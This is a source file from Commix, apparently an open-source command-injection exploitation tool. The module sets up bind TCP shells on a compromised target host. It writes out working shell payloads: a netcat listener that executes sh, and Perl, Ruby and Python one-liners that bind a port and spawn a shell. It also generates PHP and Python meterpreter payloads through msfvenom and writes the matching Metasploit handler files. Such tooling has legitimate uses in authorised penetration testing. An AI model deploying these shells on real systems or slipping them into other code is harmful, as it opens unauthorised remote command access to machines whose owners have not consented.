#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (http://commixproject.com).
Copyright (c) 2014-2017 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import os
import re
import sys
import time
import base64
import subprocess
from src.utils import menu
from src.utils import settings
from src.thirdparty.colorama import Fore, Back, Style, init

"""
Check for available shell options.
"""
def shell_options(option):
  if option.lower() == "bind_tcp":
    warn_msg = "You are already into the '" + option.lower() + "' mode."
    print settings.print_warning_msg(warn_msg)
  elif option.lower() == "?": 
    menu.reverse_tcp_options()
  elif option.lower() == "quit": 
    sys.exit(0)
  elif option[0:3].lower() == "set":
    if option[4:9].lower() == "rhost":
      check_lhost(option[10:])
    if option[4:9].lower() == "lhost":
      err_msg =  "The '" + option[4:9].upper() + "' option, is not "
      err_msg += "usable for 'bind_tcp' mode. Use 'RHOST' option."
      print settings.print_error_msg(err_msg)  
    if option[4:9].lower() == "lport":
      check_lport(option[10:])
  else:
    return option

"""
Success msg.
"""
def shell_success():
  success_msg = "Everything is in place, cross your fingers and check for a shell on port " + settings.LPORT + "!\n"
  sys.stdout.write(settings.print_success_msg(success_msg))
  sys.stdout.flush()

"""
Error msg if the attack vector is available only for Windows targets.
"""
def windows_only_attack_vector():
    error_msg = "This attack vector is available only for Windows targets."
    print settings.print_error_msg(error_msg)

"""
Message regarding the MSF handler.
"""
def msf_launch_msg(output):
    info_msg = "Type \"msfconsole -r " + os.path.abspath(output) + "\" (in a new window)."
    print settings.print_info_msg(info_msg)
    info_msg = "Once the loading is done, press here any key to continue..."
    sys.stdout.write(settings.print_info_msg(info_msg))
    sys.stdin.readline().replace("\n","")
    # Remove the ouput file.
    os.remove(output)

"""
Set up the PHP working directory on the target host.
"""
def set_php_working_dir():
  while True:
    if not menu.options.batch:
      question_msg = "Do you want to use '" + settings.WIN_PHP_DIR 
      question_msg += "' as PHP working directory on the target host? [Y/n] > "
      sys.stdout.write(settings.print_question_msg(question_msg))
      php_dir = sys.stdin.readline().replace("\n","").lower()
    else:
      php_dir = ""
    if len(php_dir) == 0:
       php_dir = "y"
    if php_dir in settings.CHOICE_YES:
      break
    elif php_dir in settings.CHOICE_NO:
      question_msg = "Please provide a custom working directory for PHP (e.g. '" 
      question_msg += settings.WIN_PHP_DIR + "') > "
      sys.stdout.write(settings.print_question_msg(question_msg))
      settings.WIN_PHP_DIR = sys.stdin.readline().replace("\n","").lower()
      settings.USER_DEFINED_PHP_DIR = True
      break
    else:
      err_msg = "'" + php_dir + "' is not a valid answer."  
      print settings.print_error_msg(err_msg)
      pass

"""
Set up the Python working directory on the target host.
"""
def set_python_working_dir():
  while True:
    if not menu.options.batch:
      question_msg = "Do you want to use '" + settings.WIN_PYTHON_DIR 
      question_msg += "' as Python working directory on the target host? [Y/n] > "
      sys.stdout.write(settings.print_question_msg(question_msg))
      python_dir = sys.stdin.readline().replace("\n","").lower()
    else:
      python_dir = "" 
    if len(python_dir) == 0:
       python_dir = "y"
    if python_dir in settings.CHOICE_YES:
      break
    elif python_dir in settings.CHOICE_NO:
      question_msg = "Please provide a custom working directory for Python (e.g. '" 
      question_msg += settings.WIN_PYTHON_DIR + "') > "
      sys.stdout.write(settings.print_question_msg(question_msg))
      settings.WIN_PYTHON_DIR = sys.stdin.readline().replace("\n","").lower()
      settings.USER_DEFINED_PYTHON_DIR = True
      break
    else:
      err_msg = "'" + python_dir + "' is not a valid answer."  
      print settings.print_error_msg(err_msg)
      pass

"""
check / set rhost option for bind TCP connection
"""
def check_rhost(rhost):
  parts = rhost.split('.')
  if len(parts) == 4 and all(part.isdigit() for part in parts) and all(0 <= int(part) <= 255 for part in parts):
    settings.RHOST= rhost
    print "RHOST => " + settings.RHOST
    return True
  else:
    err_msg = "The provided IP is not in "
    err_msg += "appropriate format (i.e 192.168.1.5)."
    print settings.print_error_msg(err_msg)
    return False

"""
check / set lport option for bind TCP connection
"""
def check_lport(lport):
  try:  
    if float(lport):
      settings.LPORT = lport
      print "LPORT => " + settings.LPORT
      return True
  except ValueError:
    err_msg = "The provided port must be numeric (i.e. 1234)"
    print settings.print_error_msg(err_msg)
    return False


"""
Set up the netcat bind TCP connection
"""
def netcat_version():

  # Defined shell
  shell = "sh"
  
  # Netcat alternatives
  NETCAT_ALTERNATIVES = [
    "nc",
    "busybox nc",
    "nc.traditional"
  ]

  while True:
    nc_version = raw_input("""
---[ """ + Style.BRIGHT + Fore.BLUE + """Unix-like targets""" + Style.RESET_ALL + """ ]--- 
Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use the default Netcat on target host.
Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use Netcat for Busybox on target host.
Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Netcat-Traditional on target host. 

commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp_netcat""" + Style.RESET_ALL + """) > """)
    
    # Default Netcat
    if nc_version == '1':
      nc_alternative = NETCAT_ALTERNATIVES[0]
      break
    # Netcat for Busybox
    if nc_version == '2':
      nc_alternative = NETCAT_ALTERNATIVES[1]
      break
    # Netcat-Traditional 
    elif nc_version == '3':
      nc_alternative = NETCAT_ALTERNATIVES[2]
      break
    # Check for available shell options  
    elif any(option in nc_version.lower() for option in settings.SHELL_OPTIONS):
      if shell_options(nc_version):
        return shell_options(nc_version)
    # Invalid command    
    else:
      err_msg = "The '" + nc_version + "' option, is not valid."  
      print settings.print_error_msg(err_msg)
      continue

  while True:
    if not menu.options.batch:
      question_msg = "Do you want to use '/bin' standard subdirectory? [y/N] > "
      sys.stdout.write(settings.print_question_msg(question_msg))
      enable_bin_dir = sys.stdin.readline().replace("\n","").lower()
    else:
      enable_bin_dir = ""
    if len(enable_bin_dir) == 0:
       enable_bin_dir = "n"              
    if enable_bin_dir in settings.CHOICE_NO:
      break  
    elif enable_bin_dir in settings.CHOICE_YES :
      nc_alternative = "/bin/" + nc_alternative
      shell = "/bin/" + shell
      break    
    elif enable_bin_dir in settings.CHOICE_QUIT:
      sys.exit(0)
    else:
      err_msg = "'" + enable_bin_dir + "' is not a valid answer."  
      print settings.print_error_msg(err_msg)
      pass


  cmd = nc_alternative + " -l -p " + settings.LPORT + " -e " + shell

  return cmd

"""
"""
def other_bind_shells():

  while True:
    other_shell = raw_input("""
---[ """ + Style.BRIGHT + Fore.BLUE + """Unix-like bind TCP shells""" + Style.RESET_ALL + """ ]---
Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use a PHP bind TCP shell.
Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use a Perl bind TCP shell.
Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use a Ruby bind TCP shell. 
Type '""" + Style.BRIGHT + """4""" + Style.RESET_ALL + """' to use a Python bind TCP shell.
\n---[ """ + Style.BRIGHT + Fore.BLUE  + """Meterpreter bind TCP shells""" + Style.RESET_ALL + """ ]---
Type '""" + Style.BRIGHT + """5""" + Style.RESET_ALL + """' to use a PHP meterpreter bind TCP shell.
Type '""" + Style.BRIGHT + """6""" + Style.RESET_ALL + """' to use a Python meterpreter bind TCP shell. 

commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp_other""" + Style.RESET_ALL + """) > """)
    # PHP-bind-shell
    if other_shell == '1':

      if not os.path.exists(settings.METASPLOIT_PATH):
        error_msg = settings.METASPLOIT_ERROR_MSG
        print settings.print_error_msg(error_msg)
        continue

      payload = "php/bind_php"
      output = "php_bind_tcp.rc"

      info_msg = "Generating the '" + payload + "' payload... "
      sys.stdout.write(settings.print_info_msg(info_msg))
      sys.stdout.flush()
      try:
        proc = subprocess.Popen("msfvenom -p " + str(payload) + 
          " RHOST=" + str(settings.RHOST) + 
          " LPORT=" + str(settings.LPORT) + 
          " -e php/base64 -o " + output + ">/dev/null 2>&1", shell=True).wait()

        with open (output, "r+") as content_file:
          data = content_file.readlines()
          data = ''.join(data).replace("\n"," ")

        print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
        # Remove the ouput file.
        os.remove(output)
        with open(output, 'w+') as filewrite:
          filewrite.write("use exploit/multi/handler\n"
                          "set payload " + payload + "\n"
                          "set rhost "+ str(settings.RHOST) + "\n"
                          "set lport "+ str(settings.LPORT) + "\n"
                          "exploit\n\n")

        if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PHP_DIR:
          set_php_working_dir()
          other_shell = settings.WIN_PHP_DIR + " -r " + data
        else:
          other_shell = "php -r \"" + data + "\""
        msf_launch_msg(output)
      except:
        print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"

      break

    # Perl-bind-shell
    elif other_shell == '2':
      other_shell = "perl -MIO -e '" \
                    "$c=new IO::Socket::INET(LocalPort," + settings.LPORT + ",Reuse,1,Listen)->accept;" \
                    "$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>'"
      break

    # Ruby-bind-shell
    elif other_shell == '3':
      other_shell = "ruby -rsocket -e '" \
                    "s=TCPServer.new(" + settings.LPORT + ");" \
                    "c=s.accept;" \
                    "s.close;" \
                    "$stdin.reopen(c);" \
                    "$stdout.reopen(c);" \
                    "$stderr.reopen(c);" \
                    "$stdin.each_line{|l|l=l.strip;" \
                    "next if l.length==0;" \
                    "(IO.popen(l,\"rb\"){|fd| fd.each_line {|o| c.puts(o.strip)}})}'"
      break

    # Python-bind-shell
    elif other_shell == '4':
      other_shell = "python -c 'import pty,os,socket%0d" \
                    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)%0d" \
                    "s.bind((\"\"," + settings.LPORT + "))%0d" \
                    "s.listen(1)%0d" \
                    "(rem, addr) = s.accept()%0d" \
                    "os.dup2(rem.fileno(),0)%0d" \
                    "os.dup2(rem.fileno(),1)%0d" \
                    "os.dup2(rem.fileno(),2)%0d" \
                    "pty.spawn(\"/bin/sh\")%0d" \
                    "s.close()'"

      break

    # PHP-bind-shell(meterpreter)
    elif other_shell == '5':

      if not os.path.exists(settings.METASPLOIT_PATH):
        error_msg = settings.METASPLOIT_ERROR_MSG
        print settings.print_error_msg(error_msg)
        continue

      payload = "php/meterpreter/bind_tcp"
      output = "php_meterpreter.rc"

      info_msg = "Generating the '" + payload + "' payload... "
      sys.stdout.write(settings.print_info_msg(info_msg))
      sys.stdout.flush()
      try:
        proc = subprocess.Popen("msfvenom -p " + str(payload) + 
          " RHOST=" + str(settings.RHOST) + 
          " LPORT=" + str(settings.LPORT) + 
          " -e php/base64 -o " + output + ">/dev/null 2>&1", shell=True).wait()

        with open (output, "r+") as content_file:
          data = content_file.readlines()
          data = ''.join(data).replace("\n"," ")

        print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
        # Remove the ouput file.
        os.remove(output)
        with open(output, 'w+') as filewrite:
          filewrite.write("use exploit/multi/handler\n"
                          "set payload " + payload + "\n"
                          "set rhost "+ str(settings.RHOST) + "\n"
                          "set lport "+ str(settings.LPORT) + "\n"
                          "exploit\n\n")

        if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PHP_DIR:
          set_php_working_dir()
          other_shell = settings.WIN_PHP_DIR + " -r " + data
        else:
          other_shell = "php -r \"" + data + "\""
        msf_launch_msg(output)
      except:
        print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
      break

    # Python-bind-shell(meterpreter)
    elif other_shell == '6':

      if not os.path.exists(settings.METASPLOIT_PATH):
        error_msg = settings.METASPLOIT_ERROR_MSG
        print settings.print_error_msg(error_msg)
        continue

      payload = "python/meterpreter/bind_tcp"
      output = "py_meterpreter.rc"

      info_msg = "Generating the '" + payload + "' payload... "
      sys.stdout.write(settings.print_info_msg(info_msg))
      sys.stdout.flush()
      try:
        proc = subprocess.Popen("msfvenom -p " + str(payload) + 
          " RHOST=" + str(settings.RHOST) + 
          " LPORT=" + str(settings.LPORT) + 
          " -o " + output + ">/dev/null 2>&1", shell=True).wait()
        
        with open (output, "r") as content_file:
          data = content_file.readlines()
          data = ''.join(data)
          data = base64.b64encode(data)

        print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
        # Remove the ouput file.
        os.remove(output)
        with open(output, 'w+') as filewrite:
          filewrite.write("use exploit/multi/handler\n"
                          "set payload " + payload + "\n"
                          "set rhost "+ str(settings.RHOST) + "\n"
                          "set lport "+ str(settings.LPORT) + "\n"
                          "exploit\n\n")

        if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PYTHON_DIR: 
          set_python_working_dir()
          other_shell = settings.WIN_PYTHON_DIR + " -c exec('" + data + "'.decode('base64'))"
        else:
          other_shell = "python -c \"exec('" + data + "'.decode('base64'))\""
        msf_launch_msg(output)
      except:
        print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
      break
    # Check for available shell options  
    elif any(option in other_shell.lower() for option in settings.SHELL_OPTIONS):
      if shell_options(other_shell):
        return shell_options(other_shell)
    # Invalid option
    else:
      err_msg = "The '" + other_shell + "' option, is not valid."  
      print settings.print_error_msg(err_msg)
      continue

  return other_shell

"""
Choose type of bind TCP connection.
"""
def bind_tcp_options():

  while True:
    bind_tcp_option = raw_input("""   
---[ """ + Style.BRIGHT + Fore.BLUE + """Bind TCP shells""" + Style.RESET_ALL + """ ]---     
Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use a netcat bind TCP shell.
Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' for other bind TCP shells.

commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp""" + Style.RESET_ALL + """) > """)

    if bind_tcp_option.lower() == "bind_tcp": 
      warn_msg = "You are already into the '" + bind_tcp_option.lower() + "' mode."
      print settings.print_warning_msg(warn_msg)
      continue

    # Option 1 - Netcat shell
    elif bind_tcp_option == '1' :
      bind_tcp_option = netcat_version()
      if bind_tcp_option.lower() not in settings.SHELL_OPTIONS:
        shell_success()
        break
      elif bind_tcp_option.lower() in settings.SHELL_OPTIONS:
        return bind_tcp_option
      else:
        pass  
    # Option 2 - Other (Netcat-Without-Netcat) shells
    elif bind_tcp_option == '2' :
      bind_tcp_option = other_bind_shells()
      if bind_tcp_option.lower() not in settings.SHELL_OPTIONS:
        shell_success()
        break
    # Check for available shell options    
    elif any(option in bind_tcp_option.lower() for option in settings.SHELL_OPTIONS):
      if shell_options(bind_tcp_option):
        return shell_options(bind_tcp_option)
    # Invalid option
    else:
      err_msg = "The '" + bind_tcp_option + "' option, is not valid."  
      print settings.print_error_msg(err_msg)
      continue


  return bind_tcp_option

"""
Set up the bind TCP connection
"""
def configure_bind_tcp():

  # Set up rhost for the bind TCP connection
  while True:
    option = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp""" + Style.RESET_ALL + """) > """)
    if option.lower() == "bind_tcp": 
      warn_msg = "You are already into the '" + option.lower() + "' mode."
      print settings.print_warning_msg(warn_msg)
      continue
    elif option.lower() == "?": 
      menu.bind_tcp_options()
      continue
    elif option.lower() == "quit": 
      sys.exit(0)
    elif len(settings.LPORT) != 0 and len(settings.RHOST) != 0:
      break 
    elif option[0:3].lower() == "set":
        if option[4:9].lower() == "rhost":
          if check_rhost(option[10:]):
            if len(settings.LPORT) == 0:
              pass
            else:
              break
          else:
            continue  
        if option[4:9].lower() == "lhost":
          err_msg =  "The '" + option[4:9].upper() + "' option, is not "
          err_msg += "usable for 'bind_tcp' mode. Use 'RHOST' option."
          print settings.print_error_msg(err_msg)  
          continue  
        if option[4:9].lower() == "lport":
          if check_lport(option[10:]):
            if len(settings.RHOST) == 0:
              pass
            else:
              break
          else:
            continue
    elif option.lower() == "os_shell" or option.lower() == "back": 
      settings.BIND_TCP = False
      break
    elif option.lower() == "reverse_tcp":
      settings.REVERSE_TCP = True
      settings.BIND_TCP = False
      break 
    else:
      err_msg = "The '" + option + "' option, is not valid."
      print settings.print_error_msg(err_msg)
      pass

# eof